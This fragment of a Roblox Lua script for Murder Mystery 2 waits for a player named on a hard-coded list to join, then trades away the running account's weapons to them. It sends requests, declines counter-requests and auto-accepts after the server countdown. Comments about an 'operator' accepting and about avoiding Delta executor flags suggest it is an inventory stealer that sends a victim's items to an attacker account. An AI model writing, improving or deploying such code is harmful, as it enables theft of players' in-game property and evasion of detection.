    local function DoTrade(target)
        -- clear any lingering trade state before starting
        local status = GetTradeStatus()
        if status == 'StartTrade' then
            pcall(function() i.Trade.DeclineTrade:FireServer() end)
            task.wait(0.5)
        elseif status == 'ReceivingRequest' then
            pcall(function() i.Trade.DeclineRequest:FireServer() end)
            task.wait(0.5)
        end

        while #q > 0 do
            local s = GetTradeStatus()

            if s == 'None' then
                -- send request then hold position — don't re-enter None
                -- branch until the current request resolves or times out
                local sent, tries = false, 1
                while not sent and tries <= 3 do
                    if SendTradeRequest(target) then
                        sent = true
                    else
                        task.wait(0.3)
                        tries = tries + 1
                    end
                end

                if sent then
                    -- actively wait up to 25s for operator to accept
                    local elapsed = 0
                    while elapsed < 25 do
                        if GetTradeStatus() == 'StartTrade' then break end
                        task.wait(0.3)
                        elapsed = elapsed + 0.3
                    end
                    if GetTradeStatus() ~= 'StartTrade' then
                        -- timed out, cancel and retry clean
                        pcall(function() i.Trade.DeclineRequest:FireServer() end)
                        task.wait(2)
                    end
                else
                    task.wait(2)
                end

            elseif s == 'SendingRequest' then
                task.wait(0.3)

            elseif s == 'ReceivingRequest' then
                pcall(function() i.Trade.DeclineRequest:FireServer() end)
                task.wait(0.3)

            elseif s == 'StartTrade' then
                local count = math.min(4, #q)
                for _ = 1, count do
                    if #q == 0 then break end
                    local item = table.remove(q, 1)
                    -- Amount is always 1 now (expanded at BuildWeaponList)
                    AddWeaponToTrade(item.DataID)
                end

                -- FIX: 13s covers MM2's mandatory ~10-12s countdown before
                -- AcceptTrade is valid server-side. Old 6s fired with ~6s still
                -- on the clock — silent rejection, items bounce, Delta flags the
                -- hanging open trade window.
                task.wait(13)

                AcceptTrade()
                WaitForTradeCompletion()
                RefreshInventory()

                if #q == 0 then return end
                task.wait(1.5)

            else
                task.wait(0.5)
            end
        end
    end

    local function AutoTradeOnJoin()
        local busy = false
        local function TryTrade(player)
            if busy then return end
            if table.find(a, player.Name) then
                busy = true
                task.wait(1)   -- reduced from 3s — player loaded by join-event fire
                DoTrade(player.Name)
            end
        end
        for _, player in ipairs(f:GetPlayers()) do TryTrade(player) end
        f.PlayerAdded:Connect(TryTrade)
    end

    if IS_MM2 then AutoTradeOnJoin() end
